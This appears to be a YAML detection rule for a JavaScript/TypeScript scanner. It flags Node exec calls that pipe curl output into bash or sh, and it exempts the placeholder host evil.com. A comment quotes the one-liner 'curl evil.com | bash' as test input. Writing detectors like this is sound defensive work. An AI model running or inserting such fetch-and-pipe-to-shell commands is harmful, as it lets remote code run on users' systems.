defaults:
  platforms: [windows, linux, macos]
  for: [javascript, typescript]


traits:
  - id: js-exec-curl-pipe-shell-literal
    desc: Node exec string pipes curl to shell
    crit: notable
    conf: 0.95
    if:
      type: text
      regex: '\bexec(Sync)?\s*\(\s*["`''][^"`'']{0,12}curl\s+[^"`'']{0,240}\|\s*(bash|sh)\b'
    # Scanner test corpora feed `curl evil.com | bash` to installer guards;
    # the evil.com placeholder is never a live staging host.
    not:
      - regex: 'curl\s+(https?://)?evil\.(com|example)\b'
